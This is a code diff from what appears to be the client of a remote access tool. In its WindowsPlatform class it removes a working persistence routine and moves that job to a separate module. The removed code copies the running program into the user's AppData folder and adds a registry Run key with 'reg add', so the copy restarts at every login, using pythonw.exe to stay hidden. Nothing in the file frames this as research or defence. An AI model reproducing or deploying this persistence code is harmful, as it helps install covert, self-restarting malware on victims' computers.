@@ -1,7 +1,4 @@
 import os
-import subprocess
-import shutil
-import sys
 
 from client.platform.base import AbstractPlatform
 
@@ -41,31 +38,8 @@ class WindowsPlatform(AbstractPlatform):
         return 'ipconfig'
 
     def install_persistence(self, reg_name, copy_name):
-        import ctypes
-        try:
-            appdata = os.environ.get('appdata', os.path.expanduser('~'))
-            file_location = os.path.join(appdata, copy_name)
-
-            if getattr(sys, 'frozen', False):
-                shutil.copyfile(sys.executable, file_location)
-                run_cmd = f'"{file_location}"'
-            else:
-                script_path = os.path.abspath(sys.argv[0])
-                if os.path.isdir(script_path):
-                    script_path = os.path.join(script_path, '__main__.py')
-                dest = file_location + '.pyw'
-                shutil.copyfile(script_path, dest)
-                file_location = dest
-                run_cmd = f'pythonw.exe "{file_location}"'
-
-            subprocess.call(
-                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
-                f'/v {reg_name} /t REG_SZ /d "{run_cmd}" /f',
-                shell=True
-            )
-            return f'[+] Created persistence with reg key: {reg_name}'
-        except Exception as e:
-            return f'[-] Persistence error: {e}'
+        from client.modules.persist import install_persistence
+        return install_persistence('registry', reg_name=reg_name, payload_name=copy_name)
 
     def get_appdata_path(self):
         return os.environ.get('appdata', os.path.expanduser('~'))
